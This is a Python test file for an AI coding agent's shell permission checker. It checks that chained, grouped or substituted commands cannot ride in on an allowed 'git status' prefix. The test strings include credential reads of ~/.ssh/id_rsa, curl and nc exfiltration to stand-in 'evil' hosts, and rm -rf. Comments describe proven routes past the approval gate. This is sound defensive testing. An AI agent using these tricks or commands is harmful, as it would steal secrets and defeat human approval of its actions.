"""Compound shell commands must not ride in on an allowed prefix.

The defect: ``_shell_command`` hands the permission matcher ONE string and
``fnmatch`` globs it whole, so an allow rule of ``git status*`` — a glob that
matches from the left — authorized ``git status && cat ~/.ssh/id_rsa`` without
ever prompting. The fix decomposes the command and requires EVERY segment to
satisfy the rule set independently, failing closed when the parse is uncertain.

The first group of tests is the security contract (via the real
``check_permission`` pipeline); the rest are decomposer unit tests.
"""

from __future__ import annotations

from types import SimpleNamespace as T

import anyio

from mantis_agent.permission_shell import ShellSegment, decompose
from mantis_agent.permissions import (
    Allow,
    Ask,
    Deny,
    PermissionContext,
    PermissionRule,
    PermissionRuleSet,
    check_permission,
)

BASH = T(name="bash", is_read_only=False)


def _rules(*allow: str, deny: tuple[str, ...] = ()) -> PermissionRuleSet:
    return PermissionRuleSet(
        allow=[PermissionRule(pattern=p, action="allow", tool_name="bash") for p in allow],
        deny=[PermissionRule(pattern=p, action="deny", tool_name="bash") for p in deny],
    )


def _decide(command: str, rules: PermissionRuleSet, answer: str = "deny"):
    """Run the full pipeline with an interactive asker that answers ``answer``.
    Returns (decision, prompts-the-asker-saw)."""

    prompts: list[str] = []

    async def asker(tool, inp, prompt):
        prompts.append(prompt)
        return answer

    ctx = PermissionContext(mode="default", rules=rules, asker=asker)

    async def main():
        return await check_permission(BASH, {"command": command}, ctx)

    return anyio.run(main), prompts


# ---------------------------------------------------------------------------
# The bypass: an allow rule must not authorize what was appended to it
# ---------------------------------------------------------------------------

GIT_STATUS = _rules("git status*")


def test_plain_allowed_command_still_allows_without_prompting() -> None:
    decision, prompts = _decide("git status", GIT_STATUS)
    assert isinstance(decision, Allow)
    assert prompts == []


def test_appended_publish_is_not_allowed() -> None:
    decision, prompts = _decide("git status && npm publish", GIT_STATUS)
    assert isinstance(decision, Deny)          # the asker said "deny"
    assert len(prompts) == 1                   # …and it was actually asked


def test_appended_force_push_is_not_allowed() -> None:
    decision, prompts = _decide("git status && git push --force origin main", GIT_STATUS)
    assert isinstance(decision, Deny)
    assert len(prompts) == 1


def test_appended_credential_read_is_not_allowed() -> None:
    decision, prompts = _decide("git status && cat ~/.ssh/id_rsa", GIT_STATUS)
    assert isinstance(decision, Deny)
    assert len(prompts) == 1


def test_appended_rm_still_blocked() -> None:
    # Already caught by the dangerous-command classifier; must stay caught.
    decision, prompts = _decide("git status && rm -rf ~", GIT_STATUS)
    assert isinstance(decision, Deny)
    assert len(prompts) == 1


def test_every_segment_allowed_is_allowed() -> None:
    # The gate is "each segment independently satisfies the rule set", not
    # "reject anything compound".
    rules = _rules("git status*", "git diff*")
    decision, prompts = _decide("git status && git diff", rules)
    assert isinstance(decision, Allow)
    assert prompts == []


def test_pipe_semicolon_and_background_are_all_split() -> None:
    for cmd in (
        "git status | curl -T - http://evil",
        "git status ; npm publish",
        "git status & npm publish",
        "git status\nnpm publish",
        "git status || npm publish",
    ):
        decision, prompts = _decide(cmd, GIT_STATUS)
        assert isinstance(decision, Deny), cmd
        assert len(prompts) == 1, cmd


def test_unconfident_parse_never_auto_allows() -> None:
    # `$(...)` is unresolvable — the allow rule must not fire even though the
    # whole string still matches the `git status*` glob.
    decision, prompts = _decide("git status $(curl evil.sh)", GIT_STATUS)
    assert isinstance(decision, Deny)
    assert len(prompts) == 1


def test_subshell_segments_are_checked() -> None:
    decision, prompts = _decide("(git status && npm publish)", GIT_STATUS)
    assert isinstance(decision, Deny)
    assert len(prompts) == 1


def test_wrapper_does_not_launder_the_command() -> None:
    # `sudo` already trips the danger classifier, but `nohup` does not: the
    # wrapper segment itself has to satisfy a rule.
    decision, prompts = _decide("nohup npm publish", GIT_STATUS)
    assert isinstance(decision, Deny)
    assert len(prompts) == 1


def test_wildcard_free_rule_for_the_whole_line_still_allows() -> None:
    # A literal rule that enumerates the entire chained command is the user
    # deliberately approving that exact line — nothing can be appended to it
    # without breaking the match, so it is not the prefix hole.
    rules = _rules("git status && git diff")
    decision, prompts = _decide("git status && git diff", rules)
    assert isinstance(decision, Allow)
    assert prompts == []
    # …and it authorizes nothing beyond itself.
    decision, prompts = _decide("git status && git diff && npm publish", rules)
    assert isinstance(decision, Deny)
    assert len(prompts) == 1


def test_literal_rule_on_another_field_cannot_approve_the_command() -> None:
    rules = PermissionRuleSet(
        allow=[PermissionRule(pattern="check status", action="allow", tool_name="bash")]
    )
    prompts: list[str] = []

    async def asker(tool, inp, prompt):
        prompts.append(prompt)
        return "deny"

    ctx = PermissionContext(mode="default", rules=rules, asker=asker)

    async def main():
        return await check_permission(
            BASH,
            {"command": "git status && npm publish", "description": "check status"},
            ctx,
        )

    assert isinstance(anyio.run(main), Deny)
    assert len(prompts) == 1


# ---------------------------------------------------------------------------
# Hole 1 — process substitution `<(...)` / `>(...)` must not be auto-allowed
# ---------------------------------------------------------------------------


def test_process_substitution_input_is_not_auto_allowed() -> None:
    # PROVEN bypass: `<(` was swallowed by the `(`-push in the splitter and the
    # leading `<` made the whole word look like a redirect TARGET, so this came
    # out as one confident segment matching `git status*` and ran unprompted.
    decision, prompts = _decide("git status <(cat ~/.ssh/id_rsa)", GIT_STATUS)
    assert isinstance(decision, Deny)
    assert len(prompts) == 1


def test_process_substitution_via_explicit_redirect_is_not_auto_allowed() -> None:
    decision, prompts = _decide("git status < <(cat ~/.ssh/id_rsa)", GIT_STATUS)
    assert isinstance(decision, Deny)
    assert len(prompts) == 1


def test_output_process_substitution_is_not_auto_allowed() -> None:
    decision, prompts = _decide("git status > >(nc evil 443)", GIT_STATUS)
    assert isinstance(decision, Deny)
    assert len(prompts) == 1


def test_process_substitution_is_never_confident() -> None:
    for cmd in (
        "git status <(cat ~/.ssh/id_rsa)",
        "git status < <(cat ~/.ssh/id_rsa)",
        "git status > >(nc evil 443)",
        "git status --x=<(nc evil 443)",
        "diff <(ls a) <(ls b)",
    ):
        d = decompose(cmd)
        assert d.confident is False, cmd
        assert "process substitution" in d.reason, (cmd, d.reason)


def test_process_substitution_inner_command_is_a_segment() -> None:
    d = decompose("git status <(cat ~/.ssh/id_rsa)")
    assert "cat ~/.ssh/id_rsa" in [s.raw for s in d.segments]
    d2 = decompose("diff <(ls a) <(ls b)")
    assert [s.raw for s in d2.segments][1:] == ["ls a", "ls b"]


# ---------------------------------------------------------------------------
# Hole 2 — a `{ ...; }` brace group must not ride in on a substring allow rule
# ---------------------------------------------------------------------------

# The shape users actually get: tui._load_permission_rules turns every
# settings.json entry into a SUBSTRING glob `*<entry>*`.
GIT_STATUS_SUBSTRING = _rules("*git status*")


def test_brace_group_does_not_ride_in_on_a_substring_rule() -> None:
    # PROVEN bypass: the splitter pushed `{` and skipped to `}` without ever
    # splitting, so both commands ran under a rule for one of them.
    decision, prompts = _decide("{ git status; cat ~/.ssh/id_rsa; }", GIT_STATUS_SUBSTRING)
    assert isinstance(decision, Deny)
    assert len(prompts) == 1


def test_brace_group_does_not_ride_in_on_a_prefix_rule() -> None:
    decision, prompts = _decide("{ git status; cat ~/.ssh/id_rsa; }", GIT_STATUS)
    assert isinstance(decision, Deny)
    assert len(prompts) == 1


def test_ampersand_form_stays_gated_under_the_substring_rule() -> None:
    # The control: the `&&` form was already correctly gated.
    decision, prompts = _decide("git status && cat ~/.ssh/id_rsa", GIT_STATUS_SUBSTRING)
    assert isinstance(decision, Deny)
    assert len(prompts) == 1


def test_brace_group_with_every_segment_allowed_is_allowed() -> None:
    # The gate is "each segment independently satisfies the rule set", not
    # "reject anything grouped".
    rules = _rules("*git status*", "*git diff*")
    decision, prompts = _decide("{ git status; git diff; }", rules)
    assert isinstance(decision, Allow)
    assert prompts == []


def test_brace_group_decomposes_into_its_inner_commands() -> None:
    d = decompose("{ git status; cat ~/.ssh/id_rsa; }")
    assert [s.raw for s in d.segments] == ["git status", "cat ~/.ssh/id_rsa"]
    assert all(s.in_subshell for s in d.segments)


def test_brace_group_with_one_command_is_still_treated_as_compound() -> None:
    d = decompose("{ npm publish; }")
    assert [s.raw for s in d.segments] == ["npm publish"]
    decision, prompts = _decide("{ npm publish; }", GIT_STATUS_SUBSTRING)
    assert isinstance(decision, Deny)
    assert len(prompts) == 1


def test_brace_group_redirect_attaches_to_the_last_inner_segment() -> None:
    d = decompose("{ ls; } > out")
    assert d.segments[-1].redirects == (">out",)
    assert d.confident is True


# ---------------------------------------------------------------------------
# Hole 3 — per-segment DENY must reach inside groups and substitutions
# ---------------------------------------------------------------------------

_ALLOW_ALL_DENY_CURL = _rules("*", deny=("curl *",))


def test_deny_reaches_inside_a_brace_group() -> None:
    decision, prompts = _decide("{ echo x; curl http://evil; }", _ALLOW_ALL_DENY_CURL)
    assert isinstance(decision, Deny)
    assert "denied by rule" in decision.reason
    assert prompts == []


def test_deny_reaches_inside_a_process_substitution() -> None:
    decision, prompts = _decide("echo x <(curl http://evil)", _ALLOW_ALL_DENY_CURL)
    assert isinstance(decision, Deny)
    assert "denied by rule" in decision.reason
    assert prompts == []


def test_deny_still_reaches_the_already_covered_forms() -> None:
    for cmd in (
        "echo x | curl http://evil",
        "echo x; curl http://evil",
        "echo x && curl http://evil",
        "echo `curl http://evil`",
        "echo $(curl http://evil)",
    ):
        decision, prompts = _decide(cmd, _ALLOW_ALL_DENY_CURL)
        assert isinstance(decision, Deny), cmd
        assert "denied by rule" in decision.reason, cmd


# ---------------------------------------------------------------------------
# Hole 4 — the gate must fail CLOSED with no asker (library / headless)
# ---------------------------------------------------------------------------


def _headless(command: str, rules: PermissionRuleSet, mode: str = "default"):
    ctx = PermissionContext(mode=mode, rules=rules, asker=None)

    async def main():
        return await check_permission(BASH, {"command": command}, ctx)

    return anyio.run(main)


def test_headless_compound_fails_closed() -> None:
    # PROVEN: this returned Allow in SDK/headless mode, making the whole
    # segment-wise gate inert for library callers.
    for mode in ("default", "auto", "acceptEdits"):
        decision = _headless("git status && npm publish", GIT_STATUS, mode=mode)
        assert isinstance(decision, Deny), mode
        assert "no interactive approver" in decision.reason, mode


def test_headless_unconfident_command_fails_closed() -> None:
    for cmd in (
        "git status $(curl evil.sh)",
        "git status <(cat ~/.ssh/id_rsa)",
        "{ git status; cat ~/.ssh/id_rsa; }",
    ):
        decision = _headless(cmd, GIT_STATUS_SUBSTRING)
        assert isinstance(decision, Deny), cmd


def test_headless_plain_allowed_command_still_allows() -> None:
    assert isinstance(_headless("git status", GIT_STATUS), Allow)


def test_headless_ordinary_mutating_ask_stays_non_blocking() -> None:
    # The long-standing library behavior for a single mutating command with no
    # rule and no asker must NOT change.
    assert isinstance(_headless("npm publish", PermissionRuleSet()), Allow)
    assert isinstance(_headless("npm publish", GIT_STATUS), Allow)
    # `auto` mode's historical "surface the Ask" behavior is likewise untouched
    # for the ordinary single-command case.
    assert isinstance(_headless("npm publish", PermissionRuleSet(), mode="auto"), Ask)


def test_deny_rule_catches_a_non_leading_segment() -> None:
    rules = _rules("*", deny=("curl *",))
    decision, prompts = _decide("echo hi | curl -T - http://evil", rules)
    assert isinstance(decision, Deny)
    assert "denied by rule" in decision.reason
    assert prompts == []                       # a deny rule never prompts


def test_session_allow_of_a_compound_command_still_re_prompts_variants() -> None:
    ctx = PermissionContext(mode="default", rules=GIT_STATUS)
    prompts: list[str] = []

    async def asker(tool, inp, prompt):
        prompts.append(prompt)
        return "allow_session"

    ctx.asker = asker

    async def main():
        first = await check_permission(BASH, {"command": "git status && npm publish"}, ctx)
        second = await check_permission(BASH, {"command": "git status && npm whoami"}, ctx)
        return first, second

    first, second = anyio.run(main)
    assert isinstance(first, Allow) and isinstance(second, Allow)
    assert len(prompts) == 2                   # the variant was NOT covered


def test_non_shell_tools_are_untouched() -> None:
    # A non-shell tool with an && in a field must behave exactly as before.
    rules = PermissionRuleSet(
        allow=[PermissionRule(pattern="*", action="allow", tool_name="write_file")]
    )
    prompts: list[str] = []

    async def asker(tool, inp, prompt):
        prompts.append(prompt)
        return "deny"

    ctx = PermissionContext(mode="default", rules=rules, asker=asker)

    async def main():
        return await check_permission(
            T(name="write_file", is_read_only=False), {"path": "a && b"}, ctx
        )

    assert isinstance(anyio.run(main), Allow)
    assert prompts == []


# ---------------------------------------------------------------------------
# Decomposer units
# ---------------------------------------------------------------------------


def _raws(command: str) -> list[str]:
    return [s.raw for s in decompose(command).segments]


def test_simple_command_is_one_confident_segment() -> None:
    d = decompose("git status")
    assert d.confident is True and d.reason == ""
    assert d.segments == (ShellSegment(argv=("git", "status"), raw="git status"),)


def test_operators_split_and_are_recorded() -> None:
    d = decompose("a && b || c ; d | e & f")
    assert [s.raw for s in d.segments] == ["a", "b", "c", "d", "e", "f"]
    assert [s.operator for s in d.segments] == ["", "&&", "||", ";", "|", "&"]
    assert d.confident is True


def test_newline_separates_like_a_semicolon() -> None:
    d = decompose("git status\nnpm publish\n")
    assert [s.raw for s in d.segments] == ["git status", "npm publish"]
    assert d.segments[1].operator == ";"


def test_quoted_operators_do_not_split() -> None:
    assert _raws("echo 'a && b'") == ["echo 'a && b'"]
    assert _raws('echo "a | b"') == ['echo "a | b"']
    assert decompose("echo 'a && b'").segments[0].argv == ("echo", "a && b")


def test_escaped_operator_does_not_split() -> None:
    d = decompose("echo a \\&\\& b")
    assert len(d.segments) == 1
    assert d.segments[0].argv == ("echo", "a", "&&", "b")


def test_quotes_are_resolved_in_argv_but_raw_is_verbatim() -> None:
    d = decompose('git commit -m "wip: it\'s fine"')
    assert d.segments[0].argv == ("git", "commit", "-m", "wip: it's fine")
    assert d.segments[0].raw == 'git commit -m "wip: it\'s fine"'


def test_redirects_are_recorded_and_kept_out_of_argv() -> None:
    d = decompose("echo hi > out.txt")
    assert d.segments[0].argv == ("echo", "hi")
    assert d.segments[0].redirects == (">out.txt",)
    assert decompose("make 2>>err.log").segments[0].redirects == ("2>>err.log",)
    assert decompose("cat < in.txt").segments[0].redirects == ("<in.txt",)
    assert decompose("ls >/dev/null 2>&1").segments[0].redirects == (">/dev/null", "2>&1")


def test_subshell_segments_are_flagged() -> None:
    d = decompose("(cd /tmp && ls) | wc -l")
    assert [s.raw for s in d.segments] == ["cd /tmp", "ls", "wc -l"]
    assert [s.in_subshell for s in d.segments] == [True, True, False]
    assert d.confident is True


def test_subshell_redirect_attaches_to_the_last_inner_segment() -> None:
    d = decompose("(ls) > out")
    assert d.segments[-1].redirects == (">out",)
    assert d.confident is True


def test_wrapper_exposes_the_wrapped_command_too() -> None:
    d = decompose("sudo git status")
    assert [s.raw for s in d.segments] == ["sudo git status", "git status"]
    assert d.segments[1].argv == ("git", "status")
    assert decompose("nice -n 10 make").segments[-1].raw == "make"
    assert decompose("nohup time ls").segments[-1].raw == "ls"


def test_confidence_failures() -> None:
    cases = {
        "ls $(whoami)": "command substitution",
        "ls `whoami`": "command substitution",
        "echo $((1+2))": "arithmetic expansion",
        "eval rm -rf /": "eval",
        "ls | xargs rm": "xargs",
        "FOO=bar make": "variable assignment",
        "env FOO=bar make": "variable assignment",
        "$CMD --now": "variable in command position",
        'echo "unterminated': "unbalanced",
        "echo 'unterminated": "unbalanced",
        "cat <<EOF": "heredoc",
        "echo hi>out": "ambiguous redirection",
        "{ ls": "unbalanced group",
    }
    for cmd, needle in cases.items():
        d = decompose(cmd)
        assert d.confident is False, cmd
        assert needle in d.reason, (cmd, d.reason)


def test_confident_cases_stay_confident() -> None:
    for cmd in (
        "git status",
        "npm run build -- --watch",
        "grep -rn 'a && b' src/",
        "ls ${HOME}/x",           # parameter expansion in an ARGUMENT is fine
        "echo {a,b}.txt",         # brace expansion is not a group
        "python -c 'print(1)'",
    ):
        assert decompose(cmd).confident is True, cmd


def test_empty_command_has_no_segments() -> None:
    assert decompose("").segments == ()
    assert decompose("   ").segments == ()
